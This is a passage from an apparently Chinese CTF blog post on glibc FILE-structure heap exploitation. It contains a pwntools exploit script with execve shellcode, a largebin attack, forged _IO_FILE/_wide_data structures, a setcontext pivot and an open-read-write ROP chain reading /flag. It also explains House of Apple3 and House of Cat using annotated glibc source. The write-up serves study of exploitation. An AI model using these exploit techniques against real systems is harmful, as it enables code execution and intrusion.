class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    pld = <span class="string">&#x27;LOGIN | r00t QWB QWXFadmin&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    pld = <span class="string">&#x27;CAT | r00t QWB QWXF$\xff\xff\xff\xff&#x27;</span></span><br><span class="line">    sa(<span class="string">&#x27;mew mew mew~~~~~~\n&#x27;</span>, pld)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat choice:\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&#x27;Context:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    <span class="comment"># only twice</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;plz input your content:\n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x418</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x438</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x428</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(r(<span class="number">8</span>)) - <span class="number">0x21a0d0</span></span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(r(<span class="number">8</span>)) - <span class="number">0xaf0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">IO_wfile_jumps = libc_base + <span class="number">0x2160c0</span></span><br><span class="line">setcontext_61 = libc_base + <span class="number">0x53a30</span> + <span class="number">61</span></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps - <span class="number">0x20</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(setcontext_61)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x1c90</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_wide += p64(p_rdi_r + <span class="number">1</span>)       <span class="comment"># rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0x290</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x418</span>, fake_file1)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x458</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">pld = p64(libc_base + <span class="number">0x21a0d0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0xaf0</span>)</span><br><span class="line">pld += p64(libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>)    <span class="comment"># bk_nextsize</span></span><br><span class="line">edit(<span class="number">2</span>, pld)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x468</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># largebin_attack</span></span><br><span class="line"></span><br><span class="line">orw = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># close</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(heap_base + <span class="number">0x1dd0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open -&gt; fd = 0</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x468</span>, orw)     <span class="comment"># 10</span></span><br><span class="line">edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))    <span class="comment"># change top_chunk.size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat idx:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0xf</span>))</span><br><span class="line">sla(<span class="string">&#x27;plz input your cat size:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x468</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="House-Of-Apple3"><a href="#House-Of-Apple3" class="headerlink" title="House_Of_Apple3"></a>House_Of_Apple3</h2><h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><p>主要是利用FILE结构体中的<code>_codecvt</code>成员和<code>_IO_wfile_jumps</code>中的函数，主要的调用链如下所示：<code>_IO_wfile_underflow -&gt; __libio_codecvt_in -&gt; (fp-&gt;_codecvt-&gt;__cd_in.step-&gt;__fct)(fp-&gt;_codecvt-&gt;__cd_in.step)</code>，或者是利用<code>_IO_wfile_underflow_mmap -&gt; __libio_codecvt_in -&gt; (fp-&gt;_codecvt-&gt;__cd_in.step-&gt;__fct)(fp-&gt;_codecvt-&gt;__cd_in.step)</code>，这里主要给出前者的利用思路。</p>
<p>以下是几个重要的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_iconv_t __cd_in;</span><br><span class="line">  _IO_iconv_t __cd_out;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">step</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span> <span class="title">step_data</span>;</span></span><br><span class="line">&#125; _IO_iconv_t;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_loaded_object</span> *__<span class="title">shlib_handle</span>;</span>		<span class="comment">// 注意这个成员</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *__modname;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For internal use by glibc.  (Accesses to this member must occur</span></span><br><span class="line"><span class="comment">     when the internal __gconv_lock mutex is acquired).  */</span></span><br><span class="line">  <span class="type">int</span> __counter;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *__from_name;</span><br><span class="line">  <span class="type">char</span> *__to_name;</span><br><span class="line"></span><br><span class="line">  __gconv_fct __fct;	<span class="comment">// 注意这个成员</span></span><br><span class="line">  __gconv_btowc_fct __btowc_fct;</span><br><span class="line">  __gconv_init_fct __init_fct;</span><br><span class="line">  __gconv_end_fct __end_fct;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Information about the number of bytes needed or produced in this</span></span><br><span class="line"><span class="comment">     step.  This helps optimizing the buffer sizes.  */</span></span><br><span class="line">  <span class="type">int</span> __min_needed_from;</span><br><span class="line">  <span class="type">int</span> __max_needed_from;</span><br><span class="line">  <span class="type">int</span> __min_needed_to;</span><br><span class="line">  <span class="type">int</span> __max_needed_to;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is a stateful encoding or not.  */</span></span><br><span class="line">  <span class="type">int</span> __stateful;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__data;		<span class="comment">/* Pointer to step-local data.  */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbuf;    <span class="comment">/* Output buffer for this step.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> *__outbufend; <span class="comment">/* Address of first byte after the output</span></span><br><span class="line"><span class="comment">				 buffer.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Is this the last module in the chain.  */</span></span><br><span class="line">  <span class="type">int</span> __flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Counter for number of invocations of the module function for this</span></span><br><span class="line"><span class="comment">     descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> __invocation_counter;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flag whether this is an internal use of the module (in the mb*towc*</span></span><br><span class="line"><span class="comment">     and wc*tomb* functions) or regular with iconv(3).  */</span></span><br><span class="line">  <span class="type">int</span> __internal_use;</span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> *__statep;</span><br><span class="line">  <span class="type">__mbstate_t</span> __state;	<span class="comment">/* This element must not be used directly by</span></span><br><span class="line"><span class="comment">			   any module; always use STATEP!  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>主要函数的源码如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cd</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">status</span>;</span></span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)	<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags &amp; _IO_NO_READS))		<span class="comment">// 绕过检查</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_read_ptr &lt; fp-&gt;_wide_data-&gt;_IO_read_end)		<span class="comment">// 绕过检查</span></span><br><span class="line">    <span class="keyword">return</span> *fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  cd = fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Maybe there is something left in the external buffer.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)		<span class="comment">// 绕过检查，进入以下语句块</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more in the external.  Convert it.  */</span></span><br><span class="line">      <span class="type">const</span> <span class="type">char</span> *read_stop = (<span class="type">const</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_last_state = fp-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_read_ptr =</span><br><span class="line">	fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      status = __libio_codecvt_in (cd, &amp;fp-&gt;_wide_data-&gt;_IO_state,		<span class="comment">// 进入目标函数</span></span><br><span class="line">				   fp-&gt;_IO_read_ptr, fp-&gt;_IO_read_end,</span><br><span class="line">				   &amp;read_stop,</span><br><span class="line">				   fp-&gt;_wide_data-&gt;_IO_read_ptr,</span><br><span class="line">				   fp-&gt;_wide_data-&gt;_IO_buf_end,</span><br><span class="line">				   &amp;fp-&gt;_wide_data-&gt;_IO_read_end);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = (<span class="type">char</span> *) read_stop;</span><br><span class="line">      ......        </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span></span></span><br><span class="line"><span class="class">__<span class="title">libio_codecvt_in</span> (<span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">codecvt</span>, __<span class="title">mbstate_t</span> *<span class="title">statep</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> *<span class="title">from_start</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">from_end</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">const</span> <span class="title">char</span> **<span class="title">from_stop</span>,</span></span><br><span class="line"><span class="class">		    <span class="title">wchar_t</span> *<span class="title">to_start</span>, <span class="title">wchar_t</span> *<span class="title">to_end</span>, <span class="title">wchar_t</span> **<span class="title">to_stop</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">codecvt_result</span> <span class="title">result</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">gconv_step</span> *<span class="title">gs</span> =</span> codecvt-&gt;__cd_in.step;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line">  <span class="type">size_t</span> dummy;</span><br><span class="line">  <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *from_start_copy = (<span class="type">unsigned</span> <span class="type">char</span> *) from_start;</span><br><span class="line"></span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbuf = (<span class="type">unsigned</span> <span class="type">char</span> *) to_start;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__outbufend = (<span class="type">unsigned</span> <span class="type">char</span> *) to_end;</span><br><span class="line">  codecvt-&gt;__cd_in.step_data.__statep = statep;</span><br><span class="line"></span><br><span class="line">  __gconv_fct fct = gs-&gt;__fct;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="keyword">if</span> (gs-&gt;__shlib_handle != <span class="literal">NULL</span>)		<span class="comment">// 绕过检查</span></span><br><span class="line">    PTR_DEMANGLE (fct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// # define DL_CALL_FCT(fctp, args) (_dl_mcount_wrapper_check ((void *) (fctp)), (*(fctp)) args)</span></span><br><span class="line">  status = DL_CALL_FCT (fct,</span><br><span class="line">			(gs, &amp;codecvt-&gt;__cd_in.step_data, &amp;from_start_copy,</span><br><span class="line">			 (<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *) from_end, <span class="literal">NULL</span>,</span><br><span class="line">			 &amp;dummy, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">    ......</span><br><span class="line"><span class="comment">// 利用点</span></span><br><span class="line"><span class="comment">// fct(gs) -&gt; *(gs-&gt;__fct)(gs) -&gt; *(codecvt-&gt;__cd_in.step-&gt;__fct)(codecvt-&gt;__cd_in.step) -&gt;</span></span><br><span class="line"><span class="comment">// *(fp-&gt;_codecvt-&gt;__cd_in.step-&gt;__fct)(fp-&gt;_codecvt-&gt;__cd_in.step)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="House-Of-Cat"><a href="#House-Of-Cat" class="headerlink" title="House_Of_Cat"></a>House_Of_Cat</h2><h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用是<code>_IO_wfile_jumps</code>跳表中的<code>_IO_wfile_seekoff</code>函数，相关源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;		<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;	<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;	<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">				   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;	<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span 